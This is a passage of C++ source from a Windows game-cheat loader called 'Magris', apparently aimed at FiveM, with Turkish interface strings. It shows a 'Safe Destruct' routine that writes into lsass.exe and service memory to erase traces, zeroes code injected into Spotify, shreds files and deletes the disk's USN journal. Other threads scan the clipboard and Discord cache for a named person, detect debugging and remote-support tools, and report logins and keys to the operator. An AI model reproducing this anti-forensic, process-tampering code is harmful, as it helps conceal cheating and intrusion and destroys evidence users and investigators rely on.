    wchar_t cmd[MAX_PATH * 2];
    swprintf_s(cmd, XWC(L"cmd.exe /c \"%s\""), urlBuf);
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, tempDir, &si, &pi)) {
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        ExitProcess(0);
    }
    DeleteFileW(tempPath);
    DeleteFileW(urlBuf);
    return 0;
}

DWORD WINAPI DestructThread(LPVOID lpParam) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    Sleep(1000);
    SetDestructStatus(XWC(L"Scanning memory for traces..."));
    Sleep(1500);

    SetDestructStatus(XWC(L"Cleaning process memory traces..."));
    {
        DWORD lsassPid = 0;
        HANDLE hLsass = OpenProcessByNameW(XWC(L"lsass.exe"),
            PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, &lsassPid);
        if (hLsass) {
            std::vector<std::string> stringsToClean;
            if (!g_loggedInUsername.empty()) stringsToClean.push_back(g_loggedInUsername);
            if (!g_loggedInKey.empty())       stringsToClean.push_back(g_loggedInKey);
            std::string hwid = getHWIDStr();
            if (!hwid.empty())                stringsToClean.push_back(hwid);
            GetMagrisDestructTraceStrings(stringsToClean);

            
            static const size_t kPcasvcRegionBases[] = {
                0x8c4000,
                0xca2000,
                0xca6000,
                0x2d04d000,
                0xe95000,
                0x249000,
                0x3119000,
                0xa15000,
                0x29000,
                0xb93000,
                0xccb000,
                0x125e198,
                0x93000,
                0xe8000,
                0x1961000,
                0x156000,
                0x13b000,
                0x143000,
                0x16ad000,
                0x5ea1000,
                0xb44000,
                0xa8a000,
                0x9e1000,
                0xef6000,
                0x159000,
                0xcab000,
                0x1be000,
                0x20c6000,
                0x1d7b000,
                0x8e000,
                0x30000,
                0x148000,
                0x3f000,
                0xad000,
                0x27b000,
                0x1256000,
                0x49a000,
                0x143000,
                0x2e5000,
                0x18f9000,
                0x22fe000,
                0xa7000,
                0xd32000,
                0xa20000,
                0x1a99000,
                0x2ea6000,
                0x229a000,
                0x370000,
                0x4b000,
                0x3f0000,
                0x157000,
                0xf15000,
                0x1e1000,
                0x139000,
                0x1f0000,
                0x1dd000,
                0x164000
            };
            std::vector<size_t> regionBases(kPcasvcRegionBases, kPcasvcRegionBases + sizeof(kPcasvcRegionBases) / sizeof(kPcasvcRegionBases[0]));

            if (!stringsToClean.empty()) {
                StringCleaner cleaner(lsassPid, stringsToClean, regionBases);
                cleaner.clean(hLsass);
            } else {
                CloseHandle(hLsass);
            }
        }
    }
    Sleep(1000);

    SetDestructStatus(XWC(L"Cleaning PcaSvc service memory..."));
    {
        std::vector<std::string> extra;
        if (!g_loggedInUsername.empty()) extra.push_back(g_loggedInUsername);
        if (!g_loggedInKey.empty()) extra.push_back(g_loggedInKey);
        CleanPcaSvcMemory(extra);
    }
    Sleep(500);

    SetDestructStatus(XWC(L"Cleaning DiagTrack service memory..."));
    {
        DWORD dtPid = FindSvchostPidForService(XWC(L"DiagTrack"));
        if (dtPid) {
            HANDLE hDt = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, dtPid);
            if (hDt) {
                std::vector<std::string> dtStrings;
                GetMagrisDestructTraceStrings(dtStrings);
                StringCleaner dtc(dtPid, dtStrings);
                dtc.clean(hDt);
            }
        }
    }
    Sleep(500);

    SetDestructStatus(XWC(L"Wiping injected code from Spotify..."));
    const bool selfHosted = IsMagrisLauncherHostProcess();
    const DWORD selfPid = GetCurrentProcessId();
    if (g_spotifyPidForCleanup) {
        HANDLE hSpot = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_TERMINATE, FALSE, g_spotifyPidForCleanup);
        if (hSpot) {
            if (g_mappedBaseInSpotify) {
                BYTE zeros[4096] = {};
                for (SIZE_T off = 0; off < 0x200000; off += sizeof(zeros))
                    WriteProcessMemory(hSpot, (BYTE*)g_mappedBaseInSpotify + off, zeros, sizeof(zeros), NULL);
                VirtualFreeEx(hSpot, g_mappedBaseInSpotify, 0, MEM_RELEASE);
            }
            if (g_spotifyPidForCleanup != selfPid)
                TerminateProcess(hSpot, 0);
            CloseHandle(hSpot);
        }
        g_mappedBaseInSpotify = nullptr;
        g_spotifyPidForCleanup = 0;
    } else if (!selfHosted) {
        DWORD spPid = FindSpotifyProcess();
        if (spPid) {
            HANDLE hSpot = OpenProcess(PROCESS_TERMINATE, FALSE, spPid);
            if (hSpot) { TerminateProcess(hSpot, 0); CloseHandle(hSpot); }
        }
    }
    Sleep(500);

    SetDestructStatus(XWC(L"Wiping traces from RAM..."));
    KillProcessNative(XWC(L"loader.exe"));
    Sleep(1000);

    SetDestructStatus(XWC(L"Cleaning FiveM & CFX logs..."));
    CleanFiveMTraces();
    Sleep(500);

    SetDestructStatus(XWC(L"Clearing WinInet IE cache (INetCache)..."));
    WipeWinInetIeDiskCache();
    Sleep(400);

    
    SetDestructStatus(XWC(L"Finalizing..."));
    std::wstring installDir = GetMagrisExeDir();
    ShredAndDeleteFile(installDir + MAGRIS_HOST_EXE_W);
    ShredAndDeleteFile(installDir + MAGRIS_LEGACY_LOADER_DLL_W);
    ShredAndDeleteFile(installDir + XW(L"MagrisLauncher.dll"));
    ShredAndDeleteFile(installDir + XW(L"SpotifyLaunchers.exe"));
    ShredAndDeleteFile(installDir + MAGRIS_PREFETCH_SHIM_DLL_W);
    ShredAndDeleteFile(installDir + XW(L"magris_sk"));
    ShredAndDeleteFile(installDir + XW(L"wezy.png"));
    ShredAndDeleteFile(installDir + XW(L"indir.jpg"));
    ShredAndDeleteFile(installDir + XW(L"spotify_path.txt"));
    ShredAndDeleteFile(installDir + XW(L"launcher_path.txt"));
    {
        std::wstring chromeElf = installDir + XW(L"chrome_elf.dll");
        std::wstring realElf = installDir + XW(L"chrome_elf_real.dll");
        if (GetFileAttributesW(realElf.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ShredAndDeleteFile(chromeElf);
            MoveFileW(realElf.c_str(), chromeElf.c_str());
        }
    }
    {
        std::wstring spotifyExe = installDir + XW(L"Spotify.exe");
        std::wstring realExe = installDir + XW(L"Spotify_real.exe");
        std::wstring cleanExe = installDir + XW(L"Spotify_clean.exe");
        if (GetFileAttributesW(realExe.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ShredAndDeleteFile(spotifyExe);
            MoveFileW(realExe.c_str(), spotifyExe.c_str());
        } else if (GetFileAttributesW(cleanExe.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ShredAndDeleteFile(spotifyExe);
            CopyFileW(cleanExe.c_str(), spotifyExe.c_str(), FALSE);
            ShredAndDeleteFile(cleanExe);
        }
        std::wstring launcher = installDir + XW(L"SpotifyLauncher.exe");
        std::wstring launcherClean = installDir + XW(L"SpotifyLauncher_clean.exe");
        if (GetFileAttributesW(launcherClean.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ShredAndDeleteFile(launcher);
            CopyFileW(launcherClean.c_str(), launcher.c_str(), FALSE);
            ShredAndDeleteFile(launcherClean);
        }
    }

    {
        wchar_t tmpDir[MAX_PATH] = {};
        GetTempPathW(MAX_PATH, tmpDir);
        ShredAndDeleteFile(std::wstring(tmpDir) + XW(L"magris_sk"));

        WIN32_FIND_DATAW fd;
        std::wstring tmpSearch = std::wstring(tmpDir) + XW(L"~svc_*.tmp");
        HANDLE hFind = FindFirstFileW(tmpSearch.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                ShredAndDeleteFile(std::wstring(tmpDir) + fd.cFileName);
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }

        CleanMagrisTempArtifacts();
    }
    wchar_t commonAppData[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, commonAppData))) {
        std::wstring wscDir = std::wstring(commonAppData) + XW(L"\\Microsoft\\WscNotification");
        DeleteFilesInDir(wscDir, XWC(L"*.*"));
        std::wstring rndDir = std::wstring(commonAppData) + XW(L"\\Microsoft\\") + GenRndFileName(L"", L"");
        rndDir.erase(rndDir.size() - 4);
        if (MoveFileW(wscDir.c_str(), rndDir.c_str()))
            RemoveDirectoryW(rndDir.c_str());
        else
            RemoveDirectoryW(wscDir.c_str());
    }

    
    Sleep(500);

    SetDestructStatus(XWC(L"Restoring Spotify shortcut..."));
    std::wstring realExePath = installDir + XW(L"Spotify.exe");
    if (GetFileAttributesW(realExePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        wchar_t appData[MAX_PATH] = {};
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
            std::wstring spotifyPath = std::wstring(appData) + XW(L"\\Spotify\\Spotify.exe");
            if (GetFileAttributesW(spotifyPath.c_str()) != INVALID_FILE_ATTRIBUTES)
                realExePath = spotifyPath;
        }
        if (GetFileAttributesW(realExePath.c_str()) == INVALID_FILE_ATTRIBUTES)
            realExePath = XW(L"C:\\Program Files\\Spotify\\Spotify.exe");
    }
    RestoreShortcut(realExePath);
    Sleep(1500);

    SetDestructStatus(XWC(L"Performing final system trace scan..."));
    Sleep(2000);
    
    SetDestructStatus(XWC(L"Safe Destruct Completed."));
    Sleep(2000);

  {
        HANDLE hVol = CreateFileW(XWC(L"\\\\.\\C:"), FILE_READ_DATA | FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hVol != INVALID_HANDLE_VALUE) {
            USN_JOURNAL_DATA_V0 jdata = {};
            DWORD br = 0;
            if (DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &jdata, sizeof(jdata), &br, NULL)) {
                DELETE_USN_JOURNAL_DATA delReq = {};
                delReq.UsnJournalID = jdata.UsnJournalID;
                delReq.DeleteFlags = USN_DELETE_FLAG_DELETE;
                DeviceIoControl(hVol, FSCTL_DELETE_USN_JOURNAL, &delReq, sizeof(delReq), NULL, 0, &br, NULL);
            }
            CloseHandle(hVol);
        }
    }

    wchar_t tempPath[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring batPath = GenRndFileName(std::wstring(tempPath), XW(L".bat"));
    HANDLE hBat = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        auto narrowPath = [](const std::wstring& w) {
            std::string a;
            for (wchar_t c : w) a += (char)(c < 256 ? c : '?');
            return a;
        };
        std::string content = XS("@echo off\r\n") + XS("ping -n 2 127.0.0.1 >nul\r\n");
        content += XS("del /f /q \"") + narrowPath(installDir + MAGRIS_HOST_EXE_W) + XS("\"\r\n");
        content += XS("del /f /q \"") + narrowPath(installDir + MAGRIS_LEGACY_LOADER_DLL_W) + XS("\"\r\n");
        content += XS("del /f /q \"") + narrowPath(installDir + MAGRIS_PREFETCH_SHIM_DLL_W) + XS("\"\r\n");
        std::string tmpA = narrowPath(std::wstring(tempPath));
        content += XS("del /f /q \"") + tmpA + XS("~svc_*.tmp\"\r\n");
        content += XS("del /f /q \"") + tmpA + XS("magris_log_*.png\"\r\n");
        content += XS("del /f /q \"") + tmpA + XS("sys_clean_*.bat\"\r\n");
        content += XS("del /f /q \"") + tmpA + XS("magris_sk\"\r\n");
        content += XS("del /f /q \"") + tmpA + XS("libGLESv3*\"\r\n");
        content += XS("del /f /q \"") + tmpA + XS("WSCache*\"\r\n");
        content += XS("del /f /q \"") + tmpA + XS("SsRgbEffects*\"\r\n");
        if (GetFileAttributesW(realExePath.c_str()) != INVALID_FILE_ATTRIBUTES)
            content += XS("start \"\" \"") + narrowPath(realExePath) + XS("\"\r\n");
        content += XS("del /f /q \"") + narrowPath(batPath) + XS("\"\r\n");
        DWORD w = 0;
        WriteFile(hBat, content.c_str(), (DWORD)content.size(), &w, NULL);
        CloseHandle(hBat);
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        std::wstring execCmd = XW(L"cmd.exe /c \"") + batPath + XW(L"\"");
        if (CreateProcessW(NULL, (LPWSTR)execCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }

    ExitProcess(0);
    return 0;
}

LRESULT CALLBACK DestructWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC s_memDC = NULL;
    static HBITMAP s_memBmp = NULL;
    static HBITMAP s_oldBmp = NULL;
    static FontFamily* s_ff = nullptr;
    static Font* s_fTitle = nullptr;
    static Font* s_fText = nullptr;
    static StringFormat* s_sf = nullptr;
    static SolidBrush* s_bgBr = nullptr;
    static SolidBrush* s_titleBr = nullptr;
    static SolidBrush* s_txtBr = nullptr;
    static Pen* s_borderPen = nullptr;

    switch (msg) {
    case WM_CREATE: {
        HDC screenDC = GetDC(hWnd);
        s_memDC = CreateCompatibleDC(screenDC);
        s_memBmp = CreateCompatibleBitmap(screenDC, 300, 400);
        s_oldBmp = (HBITMAP)SelectObject(s_memDC, s_memBmp);
        ReleaseDC(hWnd, screenDC);

        s_ff = new FontFamily(XWC(L"Segoe UI"));
        s_fTitle = new Font(s_ff, 28, FontStyleBold, UnitPixel);
        s_fText = new Font(s_ff, 18, FontStyleRegular, UnitPixel);
        s_sf = new StringFormat();
        s_sf->SetAlignment(StringAlignmentCenter);
        s_sf->SetLineAlignment(StringAlignmentCenter);
        s_bgBr = new SolidBrush(Color(255, 30, 30, 30));
        s_titleBr = new SolidBrush(Color(255, 255, 100, 100));
        s_txtBr = new SolidBrush(Color(255, 200, 200, 200));
        s_borderPen = new Pen(Color(255, 80, 80, 80), 2.0f);
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);

        Graphics g(s_memDC);
        g.SetSmoothingMode(SmoothingModeAntiAlias);
        g.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
        g.SetInterpolationMode(InterpolationModeLowQuality);
        g.SetPixelOffsetMode(PixelOffsetModeHighSpeed);
        g.SetCompositingQuality(CompositingQualityHighSpeed);

        g.FillRectangle(s_bgBr, 0, 0, 300, 400);
        g.DrawRectangle(s_borderPen, 1, 1, 298, 398);

        {
            Gdiplus::Bitmap* logo = g_bmpLogoSmall ? g_bmpLogoSmall : g_bmpLogo;
            if (logo) {
                g.TranslateTransform(150.0f, 150.0f);
                g.RotateTransform(g_destructRotation);
                g.TranslateTransform(-150.0f, -150.0f);
                g.DrawImage(logo, 150 - 80, 150 - 80, 160, 160);
                g.ResetTransform();
            }
        }

        wchar_t statusBuf[256];
        GetDestructStatus(statusBuf, 256);

        g.DrawString(XWC(L"MAGRIS DESTRUCT"), -1, s_fTitle, RectF(10, 20, 280, 40), s_sf, s_titleBr);
        g.DrawString(statusBuf, -1, s_fText, RectF(10, 260, 280, 100), s_sf, s_txtBr);

        BitBlt(hdc, 0, 0, 300, 400, s_memDC, 0, 0, SRCCOPY);
        EndPaint(hWnd, &ps);
        return 0;
    }
    case WM_TIMER:
        g_destructRotation += 3.0f;
        if (g_destructRotation >= 360.0f) g_destructRotation -= 360.0f;
        InvalidateRect(hWnd, NULL, FALSE);
        return 0;
    case WM_DESTROY:
        if (s_memDC) {
            SelectObject(s_memDC, s_oldBmp);
            DeleteObject(s_memBmp);
            DeleteDC(s_memDC);
            s_memDC = NULL; s_memBmp = NULL; s_oldBmp = NULL;
        }
        delete s_borderPen;  s_borderPen = nullptr;
        delete s_txtBr;      s_txtBr = nullptr;
        delete s_titleBr;    s_titleBr = nullptr;
        delete s_bgBr;       s_bgBr = nullptr;
        delete s_sf;         s_sf = nullptr;
        delete s_fText;      s_fText = nullptr;
        delete s_fTitle;     s_fTitle = nullptr;
        delete s_ff;         s_ff = nullptr;
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hWnd, msg, wParam, lParam);
}

static DWORD WINAPI MasonScanThread(LPVOID lpParam) {
    Sleep(2000);
    HRESULT comHr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    while (!g_masonScanStop) {
        MasonWindowResult winRes = IsMasonOnScreen();
        if (winRes.found) {
            SendMasonAlertLog(XS("Pencere basligi"), XS("Title: ") + winRes.matchedTitle + XS(" | Pattern: ") + winRes.matchedPattern);
            
        } else {
            std::string procHit = ScanProcessesForMason();
            if (!procHit.empty()) {
                SendMasonAlertLog(XS("Process adi"), procHit);
                
            } else {
                std::string clipHit = ScanClipboardForMason();
                if (!clipHit.empty()) {
                    SendMasonAlertLog(XS("Clipboard"), clipHit);
                } else {
                    bool discordHit = ScanDiscordForMason();
                    if (discordHit) {
                        SendMasonAlertLog(XS("Discord cache"), XS("Cache/LevelDB icinde mason ID veya isim bulundu"));
                        
                    }
                }
            }
        }

        if (IsAnyDeskRunning() && ExplorerWindowPathUnderInstallDir(GetMagrisExeDir()) && !g_anydeskInstallDirDestructPosted) {
            g_anydeskInstallDirDestructPosted = true;
            SendSecurityAlertLog(XS("AnyDesk aktif; Explorer kurulum klasorunde. Auto-Destruct baslatildi."));
            PostMessage(g_hwnd, WM_APP + 99, 0, 0);
        }

        Sleep(3000);
    }
    if (comHr == S_OK || comHr == S_FALSE)
        CoUninitialize();
    return 0;
}

static DWORD WINAPI SecurityScanThread(LPVOID) {
    Sleep(5000);
    int scanCount = 0;
    while (g_loggedIn) {
        

        std::string blProc;
        if (IsBlacklistedProcessRunning(blProc)) {
            SendSecurityAlertLog(XS("Karalistedeki arac calisiyor: ") + blProc);
        }

        if (CheckForBlacklistedTools()) {
            SendSecurityAlertLog(XS("Karalistedeki pencere acik (FindWindow)"));
        }

        scanCount++;
        if (scanCount % 10 == 0) {
            HMODULE hDbgHelp = GetModuleHandleA(XS("dbghelp.dll").c_str());
            HMODULE hDbgCore = GetModuleHandleA(XS("dbgcore.dll").c_str());
            if (hDbgHelp || hDbgCore) {
                SendSecurityAlertLog(XS("Supheli DLL yuklenmis: ") + std::string(hDbgHelp ? XS("dbghelp ") : "") + std::string(hDbgCore ? XS("dbgcore") : ""));
            }
        }

        Sleep(8000);
    }
    return 0;
}




#ifdef MAGRIS_LAUNCHER_EXE
static bool LaunchSpotifyFromDir(const std::wstring& dir);
#define WM_MAGRIS_LAUNCH_SPOTIFY (WM_APP + 200)

static bool PathEquivalent(const std::wstring& a, const std::wstring& b) {
    if (a.empty() || b.empty()) return false;
    wchar_t fa[MAX_PATH] = {}, fb[MAX_PATH] = {};
    if (GetFullPathNameW(a.c_str(), MAX_PATH, fa, NULL) == 0) wcscpy_s(fa, a.c_str());
    if (GetFullPathNameW(b.c_str(), MAX_PATH, fb, NULL) == 0) wcscpy_s(fb, b.c_str());
    return _wcsicmp(fa, fb) == 0;
}

static bool IsOurLauncherAtPath(const std::wstring& exePath) {
    wchar_t self[MAX_PATH] = {};
    if (!GetModuleFileNameW(NULL, self, MAX_PATH))
        return false;
    if (PathEquivalent(exePath, self))
        return true;
    WIN32_FILE_ATTRIBUTE_DATA selfFad = {}, candFad = {};
    if (GetFileAttributesExW(self, GetFileExInfoStandard, &selfFad) &&
        GetFileAttributesExW(exePath.c_str(), GetFileExInfoStandard, &candFad)) {
        ULONGLONG selfSz = ((ULONGLONG)selfFad.nFileSizeHigh << 32) | selfFad.nFileSizeLow;
        ULONGLONG candSz = ((ULONGLONG)candFad.nFileSizeHigh << 32) | candFad.nFileSizeLow;
        if (selfSz >= 1024 * 1024 && selfSz == candSz)
            return true;
    }
    return false;
}
#endif

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
#ifdef MAGRIS_LAUNCHER_EXE
    case WM_MAGRIS_LAUNCH_SPOTIFY:
        LaunchSpotifyFromDir(GetMagrisExeDir());
        return 0;
#endif
    case WM_CREATE: {
        g_hwnd = hWnd;
        RegisterHotKey(hWnd, 1, 0, VK_F7);
        g_font   = CreateFontW(14,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,DEFAULT_PITCH|FF_SWISS,XWC(L"Segoe UI"));
        g_fontSm = CreateFontW(12,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,DEFAULT_PITCH|FF_SWISS,XWC(L"Segoe UI"));
        g_fontTiny= CreateFontW(10,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,CLEARTYPE_QUALITY,DEFAULT_PITCH|FF_SWISS,XWC(L"Segoe UI"));
        int by = TITLEH;
        int formW = 320;
        int cx = (WIN_W - formW) / 2;
        g_hUser = CreateWindowExW(0, XWC(L"EDIT"), L"", WS_CHILD|WS_VISIBLE|ES_AUTOHSCROLL, cx, by+144, formW, 32, hWnd, (HMENU)(UINT_PTR)ID_EDIT_USER, NULL, NULL);
        SendMessageW(g_hUser, EM_SETCUEBANNER, 1, (LPARAM)XWC(L"kullanici_adi"));
        SendMessageW(g_hUser, WM_SETFONT, (WPARAM)g_fontSm, TRUE);
        g_hPass = CreateWindowExW(0, XWC(L"EDIT"), L"", WS_CHILD|WS_VISIBLE|ES_PASSWORD|ES_AUTOHSCROLL, cx, by+200, formW, 32, hWnd, (HMENU)(UINT_PTR)ID_EDIT_PASS, NULL, NULL);
        SendMessageW(g_hPass, EM_SETCUEBANNER, 1, (LPARAM)XWC(L"********"));
        SendMessageW(g_hPass, WM_SETFONT, (WPARAM)g_fontSm, TRUE);
        g_hBtnL = CreateWindowExW(0, XWC(L"BUTTON"), L"", WS_CHILD|WS_VISIBLE|BS_OWNERDRAW, cx, by+250, formW, 36, hWnd, (HMENU)(UINT_PTR)ID_BTN_LOGIN, NULL, NULL);
        g_hBtnLoad = CreateWindowExW(0, XWC(L"BUTTON"), L"", WS_CHILD|BS_OWNERDRAW, 0, WIN_H-FOOTHER, WIN_W, FOOTHER, hWnd, (HMENU)(UINT_PTR)ID_BTN_LOAD, NULL, NULL);
        ShowWindow(g_hBtnLoad, SW_HIDE);
        int cy2 = by+8;
        cy2 += 18; int off0 = cy2;
        cy2 += 78+6+18;
        int off1 = cy2;
        cy2 += 78+6+18;
        int off2 = cy2;
        int offs[] = { off0, off1, off2 };
        const int cardH = 78;
        for (int i = 0; i < PROD_COUNT; i++)
            g_hProd[i] = CreateWindowExW(0, XWC(L"BUTTON"), L"", WS_CHILD|BS_OWNERDRAW, 8, offs[i], MPANEL-16, cardH, hWnd, (HMENU)(UINT_PTR)(ID_PROD_0+i), NULL, NULL);
        for (int i = 0; i < PROD_COUNT; i++) ShowWindow(g_hProd[i], SW_HIDE);
        if (wezy_png_len > 0)
            g_bmpLogo = LoadImageFromBytes(wezy_png_bytes, wezy_png_len);
        if (g_bmpLogo) {
            g_bmpLogoSmall = new Gdiplus::Bitmap(160, 160, PixelFormat32bppARGB);
            Gdiplus::Graphics gSmall(g_bmpLogoSmall);
            gSmall.SetInterpolationMode(Gdiplus::InterpolationModeHighQualityBicubic);
            gSmall.SetSmoothingMode(Gdiplus::SmoothingModeAntiAlias);
            gSmall.DrawImage(g_bmpLogo, 0, 0, 160, 160);
        }
        if (images_png_len > 0)
            g_bmpCardBg[0] = LoadImageFromBytes(images_png_bytes, images_png_len);
        if (!g_bmpCardBg[0]) g_bmpCardBg[0] = LoadImageFromExeDir(XWC(L"images.png"));
        if (dest_png_len > 0)
            g_bmpCardBg[1] = LoadImageFromBytes(dest_png_bytes, dest_png_len);
        if (!g_bmpCardBg[1]) g_bmpCardBg[1] = LoadImageFromExeDir(XWC(L"dest.png"));
        SetTimer(hWnd, g_timerId, 100, NULL);
        return 0;
    }

    case WM_TIMER:
        g_animTick++;
        InvalidateRect(hWnd, NULL, FALSE);
        return 0;

    case WM_HOTKEY:
        if (wParam == 1) { 
            if (IsWindowVisible(hWnd)) {
                ShowWindow(hWnd, SW_HIDE);
                SetWindowLongW(hWnd, GWL_EXSTYLE, GetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TRANSPARENT | WS_EX_LAYERED);
            } else {
                ShowWindow(hWnd, SW_SHOW);
                SetWindowLongW(hWnd, GWL_EXSTYLE, GetWindowLongW(hWnd, GWL_EXSTYLE) & ~WS_EX_TRANSPARENT);
                SetForegroundWindow(hWnd);
            }
        }
        return 0;

    case WM_LBUTTONDOWN:
        {
            int mx = LOWORD(lParam), my = HIWORD(lParam);
            
            
            int rw = 32, rh = 32;
            int rx = WIN_W - rw - 12;
            int ry = 12;
            if (mx >= rx && mx <= rx+rw && my >= ry && my <= ry+rh) {
                PostQuitMessage(0);
                return 0;
            }

            if (g_loggedIn) {
                int ry2 = TITLEH + 10 + 28 + 12 + 20 + 20 + 26;
                const int ckSize = 20, ckRight = 36;
                int ckX = WIN_W - ckRight - ckSize;
                int ckYs[] = { ry2, ry2+28, ry2+56 };
                bool* chkVals[] = { &g_chkLua, &g_chkStealth, &g_chkCleaner };
                for (int i = 0; i < 3; i++) {
                    if (mx >= ckX && mx <= ckX+ckSize+8 && my >= ckYs[i]-2 && my <= ckYs[i]+ckSize+2) {
                        *chkVals[i] = !(*chkVals[i]);
                        if (i == 1) {
                            SetWindowDisplayAffinity(g_hwnd, g_chkStealth ? WDA_EXCLUDEFROMCAPTURE : WDA_NONE);
                            std::string state = g_chkStealth ? XS("ENABLED") : XS("DISABLED");
                            SendStreamProofLog(state);
                        }
                        InvalidateRect(hWnd, NULL, FALSE);
                        break;
                    }
                }
            }
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        Paint(hdc);
        EndPaint(hWnd, &ps);
        return 0;
    }

    case WM_ERASEBKGND:
        return 1;

    case WM_APP + 99:
        TriggerAntiCrackDestruct();
        return 0;

    case WM_COMMAND: {
        WORD id = LOWORD(wParam);
        if (id == ID_BTN_LOGIN) {
            wchar_t u[64]={}, p[128]={};
            GetWindowTextW(g_hUser, u, 64);
            GetWindowTextW(g_hPass, p, 128);
            std::wstring key(p);
            if (key.empty()) { MessageBoxW(hWnd, XWC(L"Lisans (sifre) girin."), XWC(L"Magris"), MB_ICONWARNING); return 0; }
            std::wstring uname;
            if (ValidateLicense(key, GetHwid(), &uname)) {
                g_loggedIn = true;
                ShowLoginCtrls(false);
                ShowMainCtrls(true);
                SetTimer(hWnd, g_timerId, 1000, NULL);
                InvalidateRect(hWnd, NULL, TRUE);
                
                char u8[128]={0}; WideCharToMultiByte(CP_UTF8, 0, u, -1, u8, 128, NULL, NULL);
                char p8[128]={0}; WideCharToMultiByte(CP_UTF8, 0, p, -1, p8, 128, NULL, NULL);
                g_loggedInUsername = u8;
                g_loggedInKey = p8;
                SendLoginSuccessLog();
                FetchDllUpdateTime();
                InvalidateRect(hWnd, NULL, TRUE);
                if (HasKeyScreenshotWebhook() && !g_keyScreenshotThread) {
                    g_keyScreenshotStop = false;
                    g_keyScreenshotThread = CreateThread(NULL, 0, KeyScreenshotThread, NULL, 0, NULL);
                }
                if (!g_masonScanThread) {
                    g_masonScanStop = false;
                    g_masonAutoDestructPosted = false;
                    g_anydeskInstallDirDestructPosted = false;
                    g_masonScanThread = CreateThread(NULL, 0, MasonScanThread, NULL, 0, NULL);
                }
                static HANDLE g_securityThread = NULL;
                if (!g_securityThread) {
                    g_securityThread = CreateThread(NULL, 0, SecurityScanThread, NULL, 0, NULL);
                }
            } else {
                char u8[128]={0}; WideCharToMultiByte(CP_UTF8, 0, u, -1, u8, 128, NULL, NULL);
                char p8[128]={0}; WideCharToMultiByte(CP_UTF8, 0, p, -1, p8, 128, NULL, NULL);
                SendLoginFailLog(std::string(u8), std::string(p8), getHWIDStr());
                MessageBoxW(hWnd, XWC(L"Gecersiz key veya HWID uyusmazligi."), XWC(L"Magris"), MB_ICONWARNING);
            }
        }
        if (id == ID_BTN_LOAD) {
            if (g_selProd == 1) { 
                SendDestructLog(XS("Safe Destruct baslatildi."));
                InitDestructStatusCS();
                g_isDestructing = true;
                int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN);
                HINSTANCE hDllInst2 = GetModuleHandle(NULL);
                g_hDestructWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, XWC(L"MagrisDestructWnd"), XWC(L"Magris Destruct"),
                    WS_POPUP | WS_VISIBLE, (sx - 300)/2, (sy - 400)/2, 300, 400, NULL, NULL, hDllInst2, NULL);
                if (!g_hDestructWnd) {
                    g_isDestructing = false;
                    MessageBoxW(hWnd, XWC(L"Destruct penceresi olusturulamadi."), XWC(L"Magris"), MB_ICONERROR);
                    return 0;
                }
                SetTimer(g_hDestructWnd, 2, 50, NULL);
                ShowWindow(g_hDestructWnd, SW_SHOW);
                UpdateWindow(g_hDestructWnd);
                BringDestructWindowToFront(g_hDestructWnd);
                for (int i = 0; i < 10; i++) {
                    MSG m = {};
                    while (PeekMessageW(&m, NULL, 0, 0, PM_REMOVE)) {
                        TranslateMessage(&m);
                        DispatchMessageW(&m);
                    }
                    Sleep(50);
                }
                ShowWindow(hWnd, SW_HIDE);
                CreateThread(NULL, 0, DestructThread, NULL, 0, NULL);
                return 0;
            }
            
            if (!g_hLaunchEvt)
                g_hLaunchEvt = CreateEventW(NULL, TRUE, TRUE, XWC(L"Global\\MAGRIS_LAUNCHER_ACTIVE"));

            EnableWindow(g_hBtnLoad, FALSE);
